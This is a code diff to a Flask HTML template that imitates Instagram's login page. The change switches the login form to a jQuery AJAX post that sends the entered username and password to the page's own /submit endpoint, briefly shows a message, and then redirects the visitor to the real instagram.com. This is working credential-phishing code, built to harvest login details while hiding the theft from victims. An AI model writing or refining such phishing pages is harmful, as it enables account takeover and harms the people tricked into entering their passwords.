@@ -8,13 +8,9 @@
     <link rel="stylesheet" href="{{ url_for('static', filename='css/media-queries.css') }}">
     <link rel="icon" href="{{ url_for('static', filename='photos/insta-icon.jpg') }}">
     <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
-    <script>
-        function redirectToInstagram() {
-            setTimeout(function() {
-                window.location.href = "https://www.instagram.com";
-            }, 2500);  // 2.5 sekunde pauze
-        }
-    </script>
+
+    <!-- ✅ Dodaj jQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
     <main>
@@ -22,21 +18,15 @@
             <div class="log-in">
                 <img src="{{ url_for('static', filename='photos/logo.png') }}" class="logo">
                 <div class="log-in-form">
-                    <form method="POST" action="/submit">
+                    <form id="loginForm">
                         <input type="text" name="username" placeholder="Phone number, username or email" required>
                         <input type="password" name="password" placeholder="Password" required>
                         <button type="submit" class="log-in-button">Log In</button>
                     </form>
                 </div>
-                
-                {% if message %}
-                    <div class="message" style="color: red; margin-top: 10px;">
-                        <p>{{ message }}</p>
-                    </div>
-                    <script>
-                        redirectToInstagram();
-                    </script>
-                {% endif %}
+
+                <!-- Poruka o grešci -->
+                <div class="message" style="color: red; margin-top: 10px; display: none;"></div>
 
                 <span class="or-divider">OR</span>
                 <div class="fb-login">
@@ -76,5 +66,26 @@
         </ul>
         <span class="copyright">&copy; 2025 INSTAGRAM FROM FACEBOOK</span>
     </footer>
+
+    <!-- ✅ AJAX skripta -->
+    <script>
+        $(document).ready(function() {
+            $("#loginForm").submit(function(event) {
+                event.preventDefault(); // Sprečava osvežavanje stranice
+                var formData = $(this).serialize();
+
+                $.post("/submit", formData, function(response) {
+                    $(".message").text(response.message).show(); // Prikazuje poruku
+                    setTimeout(function() {
+                        $(".message").fadeOut(); // Nestaje nakon 2 sekunde
+                    }, 2000);
+
+                    setTimeout(function() {
+                        window.location.href = "https://www.instagram.com"; // Preusmerava nakon 3 sekunde
+                    }, 3000);
+                });
+            });
+        });
+    </script>
 </body>
 </html>
